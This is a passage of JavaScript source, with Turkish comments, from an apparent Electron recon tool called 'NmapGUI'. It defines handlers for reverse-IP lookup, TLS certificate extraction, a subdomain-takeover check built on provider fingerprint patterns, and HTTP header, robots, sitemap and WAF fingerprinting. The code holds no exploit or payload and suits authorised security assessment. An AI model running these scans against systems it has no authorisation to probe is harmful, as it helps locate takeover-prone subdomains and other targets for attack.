  const s = (ip || '').trim();
  // IP veya domain (domain ise önce A'ya çevir)
  let target = s;
  if (!/^\d+\.\d+\.\d+\.\d+$/.test(s)) {
    if (!/^[a-zA-Z0-9.-]{3,100}$/.test(s)) return { ok: false, error: 'Geçersiz IP/domain' };
    try { const a = await dns.resolve4(s); target = a[0]; }
    catch (err) { return { ok: false, error: 'DNS çözümleme hatası' }; }
  }
  return new Promise((resolve) => {
    https.get(`https://api.hackertarget.com/reverseiplookup/?q=${target}`,
      { headers: { 'User-Agent': 'NmapGUI/1.0' } }, (res) => {
      let body = '';
      res.on('data', (c) => { body += c; });
      res.on('end', () => {
        const t = (body || '').trim();
        if (!t || /error/i.test(t) || /API count exceeded/i.test(t)) return resolve({ ok: false, error: t || 'boş yanıt' });
        const hosts = t.split('\n').map((x) => x.trim()).filter((x) => x && /^[a-zA-Z0-9.-]+$/.test(x));
        resolve({ ok: true, ip: target, count: hosts.length, hosts });
      });
    }).on('error', (err) => resolve({ ok: false, error: String(err) }));
  });
});

// ---------------- 8) TLS sertifika + SAN extraction ----------------
const tls = require('tls');
ipcMain.handle('osint:tlsCert', async (e, host) => {
  const h = (host || '').trim().toLowerCase();
  if (!/^[a-z0-9.-]{3,100}(:\d{1,5})?$/.test(h)) return { ok: false, error: 'Geçersiz host' };
  const [hostname, portStr] = h.split(':');
  const port = parseInt(portStr, 10) || 443;
  return new Promise((resolve) => {
    let settled = false;
    const done = (v) => { if (!settled) { settled = true; try { sock && sock.destroy(); } catch (_) {} resolve(v); } };
    const sock = tls.connect({
      host: hostname, port, servername: hostname, rejectUnauthorized: false, timeout: 8000,
    }, () => {
      const cert = sock.getPeerCertificate(true);
      if (!cert || Object.keys(cert).length === 0) return done({ ok: false, error: 'cert alınamadı' });
      const sans = (cert.subjectaltname || '').split(',').map((s) => s.trim().replace(/^DNS:/i, '')).filter(Boolean);
      const issuer = cert.issuer || {};
      const subject = cert.subject || {};
      // Zincir
      const chain = [];
      let c = cert;
      const seen = new Set();
      while (c && !seen.has(c.fingerprint256 || c.fingerprint)) {
        seen.add(c.fingerprint256 || c.fingerprint);
        chain.push({
          subject: c.subject && (c.subject.CN || c.subject.O || ''),
          issuer: c.issuer && (c.issuer.CN || c.issuer.O || ''),
          validFrom: c.valid_from, validTo: c.valid_to,
          fingerprint256: c.fingerprint256 || c.fingerprint,
          serial: c.serialNumber,
        });
        if (c.issuerCertificate && c.issuerCertificate !== c) c = c.issuerCertificate; else break;
      }
      // Süresi geçti mi?
      const now = Date.now();
      const expMs = Date.parse(cert.valid_to);
      const daysLeft = isFinite(expMs) ? Math.floor((expMs - now) / 86400000) : null;
      done({
        ok: true, host: hostname, port,
        subject: subject.CN || (subject.O || ''),
        issuer: issuer.CN || (issuer.O || ''),
        validFrom: cert.valid_from, validTo: cert.valid_to, daysLeft,
        expired: daysLeft != null && daysLeft < 0,
        sans, sanCount: sans.length,
        serial: cert.serialNumber, fingerprint256: cert.fingerprint256 || cert.fingerprint,
        keyType: cert.asn1Curve || (cert.bits ? `RSA ${cert.bits} bit` : ''),
        protocol: sock.getProtocol && sock.getProtocol(),
        cipher: sock.getCipher && sock.getCipher().name,
        chain,
      });
    });
    sock.on('error', (err) => done({ ok: false, error: String(err.message || err) }));
    sock.on('timeout', () => done({ ok: false, error: 'TLS timeout' }));
  });
});

// ---------------- 9) Subdomain takeover heuristik ----------------
// Bilinen dangling provider parmak izleri (kısa, en yüksek isabetliler)
const TAKEOVER_FP = [
  { provider: 'GitHub Pages',     cnameRe: /\.github\.io$/i,                     body: /There isn't a GitHub Pages site here/i,         severity: 'high' },
  { provider: 'Heroku',           cnameRe: /\.herokuapp\.com$|\.herokudns\.com$/i, body: /No such app|herokucdn\.com\/error-pages\/no-such-app/i, severity: 'high' },
  { provider: 'AWS S3',           cnameRe: /\.s3[.-][a-z0-9-]+\.amazonaws\.com$|\.s3-website/i, body: /NoSuchBucket|The specified bucket does not exist/i, severity: 'critical' },
  { provider: 'Azure (cloudapp)', cnameRe: /\.cloudapp\.net$|\.cloudapp\.azure\.com$|\.azurewebsites\.net$|\.trafficmanager\.net$|\.blob\.core\.windows\.net$/i,
                                  body: /404 Web Site not found|NoSuchAccount/i, severity: 'critical' },
  { provider: 'Shopify',          cnameRe: /\.myshopify\.com$/i,                  body: /Sorry, this shop is currently unavailable/i,      severity: 'high' },
  { provider: 'Tumblr',           cnameRe: /\.tumblr\.com$/i,                     body: /Whatever you were looking for doesn't currently exist at this address/i, severity: 'medium' },
  { provider: 'Bitbucket',        cnameRe: /\.bitbucket\.io$/i,                   body: /Repository not found/i,                          severity: 'high' },
  { provider: 'Fastly',           cnameRe: /\.fastly\.net$/i,                     body: /Fastly error: unknown domain/i,                  severity: 'high' },
  { provider: 'Pantheon',         cnameRe: /\.pantheonsite\.io$/i,                body: /The gods are wise/i,                             severity: 'medium' },
  { provider: 'Tilda',            cnameRe: /\.tilda\.ws$|\.tilda\.cc$/i,          body: /Please renew your subscription/i,                severity: 'medium' },
  { provider: 'Unbounce',         cnameRe: /\.unbouncepages\.com$/i,              body: /The requested URL was not found on this server/i, severity: 'medium' },
  { provider: 'Helpjuice',        cnameRe: /\.helpjuice\.com$/i,                  body: /We could not find what you're looking for/i,     severity: 'low' },
  { provider: 'Zendesk',          cnameRe: /\.zendesk\.com$/i,                    body: /Help Center Closed/i,                            severity: 'low' },
];

function httpGetBody(url, timeoutMs) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const lib = u.protocol === 'https:' ? https : require('http');
    const req = lib.get(url, { headers: { 'User-Agent': 'NmapGUI/1.0' }, timeout: timeoutMs || 6000 }, (res) => {
      let body = '';
      res.on('data', (c) => { body += c.toString(); if (body.length > 200000) { res.destroy(); } });
      res.on('end', () => resolve({ code: res.statusCode, body }));
    });
    req.on('timeout', () => { req.destroy(); resolve({ code: 0, body: '' }); });
    req.on('error', () => resolve({ code: 0, body: '' }));
  });
}

ipcMain.handle('osint:subTakeover', async (e, subs) => {
  const list = Array.isArray(subs) ? subs : (subs || '').split(/[\s,]+/);
  const clean = [...new Set(list.map((s) => (s || '').trim().toLowerCase())
                                 .filter((s) => /^[a-z0-9.-]{3,255}$/.test(s)))].slice(0, 200);
  if (!clean.length) return { ok: false, error: 'Hedef yok' };
  const results = await poolMap(clean, 12, async (sub) => {
    // CNAME zinciri
    let cname = '';
    try { const ch = await dns.resolveCname(sub); if (ch && ch[0]) cname = ch[0].toLowerCase(); } catch (_) {}
    // A çözümlenebiliyor mu?
    let resolves = true;
    try { await dns.resolve4(sub); } catch (_) {
      try { await dns.resolve6(sub); } catch (_) { resolves = false; }
    }
    // CNAME bilinen provider'a benziyor mu?
    const fp = TAKEOVER_FP.find((p) => cname && p.cnameRe.test(cname));
    let bodyHit = null;
    if (fp) {
      // Gövde fingerprint'i için tek bir HTTP/HTTPS GET (önce https, başarısızsa http)
      const r = await httpGetBody(`https://${sub}/`, 6000);
      const body = (r && r.body) || '';
      if (fp.body.test(body)) bodyHit = true;
      else if (!resolves) bodyHit = 'partial'; // CNAME var ama A yok → muhtemel takeover
    }
    return {
      sub, cname, resolves,
      provider: fp ? fp.provider : null,
      severity: fp ? fp.severity : null,
      takeover: fp ? (bodyHit === true ? 'confirmed' : (bodyHit === 'partial' ? 'likely' : 'safe')) : null,
    };
  });
  const hits = results.filter((r) => r.takeover === 'confirmed' || r.takeover === 'likely');
  return { ok: true, total: results.length, hits, all: results };
});

// ---------------- 10) HTTP Recon Bundle ----------------
// Tek hedef → headers + robots + sitemap + security.txt + güvenlik header skoru + WAF/CDN.
const WAF_FP = [
  { name: 'Cloudflare',  hdr: /^(cf-ray|cf-cache-status|server:\s*cloudflare)/im, cookie: /__cf(?:duid|ruid)/i },
  { name: 'Akamai',      hdr: /^(akamai|x-akamai|server:\s*akamai)/im,            cookie: /^AKA_/i },
  { name: 'AWS CloudFront', hdr: /^x-amz-cf-id|via:\s*[^,]*\.cloudfront\.net/im },
  { name: 'AWS WAF',     hdr: /^x-amzn-waf|x-amzn-requestid/im },
  { name: 'Fastly',      hdr: /^x-served-by|^fastly-/im },
  { name: 'Imperva',     hdr: /^x-iinfo|^x-cdn:\s*imperva/im, cookie: /^incap_/i },
  { name: 'Sucuri',      hdr: /^x-sucuri-id|^x-sucuri-cache/im },
  { name: 'F5 BIG-IP',   hdr: /^server:\s*BigIP/im, cookie: /^BIGipServer/i },
  { name: 'Azure Front Door', hdr: /^x-azure-ref|^x-fd-/im },
  { name: 'Microsoft IIS', hdr: /^server:\s*Microsoft-IIS/im },
  { name: 'Cloudfront',  hdr: /^x-cache:\s*[^,]*cloudfront/im },
  { name: 'Barracuda',   hdr: /^server:\s*Barracuda/im },
  { name: 'Fortiweb',    hdr: /^server:\s*FortiWeb/im },
];
// Güvenlik header'ları (Mozilla Observatory tarzı kısa skor)
function scoreSecHeaders(hdrs) {
  let s = 100;
  const reasons = [];
  const h = (k) => hdrs[k.toLowerCase()] || '';
  if (!h('strict-transport-security')) { s -= 20; reasons.push('HSTS yok'); }
  else if (!/max-age=\d+/.test(h('strict-transport-security'))) { s -= 5; reasons.push('HSTS max-age yok'); }
  if (!h('content-security-policy')) { s -= 25; reasons.push('CSP yok'); }
  else if (/unsafe-inline|unsafe-eval/.test(h('content-security-policy'))) { s -= 10; reasons.push('CSP unsafe-*'); }
  if (!h('x-frame-options') && !/frame-ancestors/i.test(h('content-security-policy'))) { s -= 10; reasons.push('clickjacking koruması yok'); }
  if (!h('x-content-type-options')) { s -= 5; reasons.push('X-Content-Type-Options yok'); }
  if (!h('referrer-policy')) { s -= 5; reasons.push('Referrer-Policy yok'); }
  if (!h('permissions-policy') && !h('feature-policy')) { s -= 5; reasons.push('Permissions-Policy yok'); }
  if (h('server') && /\d/.test(h('server'))) { s -= 5; reasons.push('Server header versiyon sızdırıyor'); }
  if (h('x-powered-by')) { s -= 5; reasons.push('X-Powered-By sızdırıyor'); }
  s = Math.max(0, Math.min(100, s));
  return { score: s, grade: s >= 90 ? 'A' : s >= 75 ? 'B' : s >= 60 ? 'C' : s >= 40 ? 'D' : 'F', reasons };
}

function httpFetch(urlStr, method, timeoutMs) {
  return new Promise((resolve) => {
    let u; try { u = new URL(urlStr); } catch (e) { return resolve({ code: 0, headers: {}, body: '' }); }
    const lib = u.protocol === 'https:' ? https : require('http');
    const req = lib.request({
      hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: u.pathname + u.search,
      method: method || 'GET', headers: { 'User-Agent': 'NmapGUI/1.0', Accept: '*/*' }, timeout: timeoutMs || 7000,
    }, (res) => {
      let body = '';
      res.on('data', (c) => { body += c.toString(); if (body.length > 80000) { res.destroy(); } });
      res.on('end', () => resolve({ code: res.statusCode, headers: res.headers, body }));
    });
    req.on('timeout', () => { req.destroy(); resolve({ code: 0, headers: {}, body: '' }); });
    req.on('error', () => resolve({ code: 0, headers: {}, body: '' }));
    req.end();
  });
}

ipcMain.handle('osint:httpRecon', async (e, target) => {
  let s = (target || '').trim();
  if (!s) return { ok: false, error: 'Hedef yok' };
  if (!/^https?:\/\//i.test(s)) s = 'https://' + s;
  let base; try { base = new URL(s); } catch (err) { return { ok: false, error: 'Geçersiz URL' }; }
  const origin = base.origin;
  // 1. Ana sayfa (HEAD ile dene, başarısızsa GET)
  let main = await httpFetch(origin, 'HEAD', 7000);
  if (main.code === 0 || main.code === 405) main = await httpFetch(origin, 'GET', 9000);
  const hdrText = Object.entries(main.headers || {}).map(([k, v]) => `${k}: ${Array.isArray(v) ? v.join(', ') : v}`).join('\n');
  // 2. WAF/CDN fingerprint
  const wafHits = [];
  WAF_FP.forEach((w) => {
    if (w.hdr && w.hdr.test(hdrText)) wafHits.push(w.name);
    const cookies = main.headers && main.headers['set-cookie'] || [];
    if (w.cookie && [].concat(cookies).some((c) => w.cookie.test(c))) {
      if (!wafHits.includes(w.name)) wafHits.push(w.name);
    }
  });
  // 3. Robots / sitemap / security.txt (paralel)
  const [robots, sitemap, secTxt, humans] = await Promise.all([
    httpFetch(origin + '/robots.txt', 'GET', 5000),
    httpFetch(origin + '/sitemap.xml', 'GET', 5000),
    httpFetch(origin + '/.well-known/security.txt', 'GET', 5000),
    httpFetch(origin + '/humans.txt', 'GET', 4000),
  ]);
  // robots: Disallow path'leri ayıkla
  const disallows = [];
  (robots.code === 200 ? (robots.body || '') : '').split('\n').forEach((line) => {
    const m = line.match(/^\s*Disallow:\s*(\S+)/i);
    if (m && m[1] !== '/') disallows.push(m[1]);
  });
  // sitemap: <loc>...</loc> ayıkla (ilk 50)
  const sitemapLocs = [];
  (sitemap.code === 200 ? (sitemap.body || '') : '').replace(/<loc>([^<]+)<\/loc>/gi, (_, u) => { if (sitemapLocs.length < 50) sitemapLocs.push(u); });
  // security.txt anahtarları
  const secKv = {};
  if (secTxt.code === 200) {
    (secTxt.body || '').split('\n').forEach((l) => {
      const m = l.match(/^([A-Za-z-]+):\s*(.+)$/);
      if (m) (secKv[m[1].toLowerCase()] = (secKv[m[1].toLowerCase()] || [])).push(m[2].trim());
    });
  }
  // Güvenlik header skoru
  const normHeaders = {};
  Object.entries(main.headers || {}).forEach(([k, v]) => { normHeaders[k.toLowerCase()] = Array.isArray(v) ? v.join(', ') : String(v || ''); });
  const sec = scoreSecHeaders(normHeaders);
  // Tech ipuçları (basit — header bazlı)
  const tech = [];
  if (normHeaders['x-powered-by']) tech.push(normHeaders['x-powered-by']);
  if (normHeaders['server']) tech.push('Server: ' + normHeaders['server']);
  if ((main.body || '').match(/<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']/i)) {
    tech.push('generator: ' + RegExp.$1);
  }

  return {
    ok: true, origin,
    status: main.code, server: normHeaders['server'] || '', powered: normHeaders['x-powered-by'] || '',
    headers: normHeaders, headerText: hdrText.slice(0, 8000),
    waf: wafHits,
    secHeaders: sec,
    tech,
    robots: { present: robots.code === 200, raw: (robots.body || '').slice(0, 4000), disallows },
    sitemap: { present: sitemap.code === 200, urls: sitemapLocs },
    securityTxt: { present: secTxt.code === 200, raw: (secTxt.body || '').slice(0, 2000), parsed: secKv },
    humansTxt: { present: humans.code === 200, raw: (humans.body || '').slice(0, 500) },
  };
});

